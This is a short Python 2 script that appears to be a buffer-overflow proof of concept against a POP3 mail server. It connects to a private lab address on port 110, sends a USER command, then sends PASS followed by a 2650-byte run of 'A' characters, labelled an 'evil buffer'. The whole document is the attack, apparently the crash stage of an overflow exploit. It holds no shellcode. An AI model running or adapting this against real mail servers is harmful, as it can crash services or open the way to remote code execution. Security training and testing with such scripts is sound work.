#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 2650
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.160.139', 110))
    data = s.recv(1024)
    s.send('USER test' + '\r\n')
    data = s.recv(1024)
    s.send('PASS' + buffer +'\r\n')
    print "\nDone!"

except:
    print "Could not connect to POP3!"
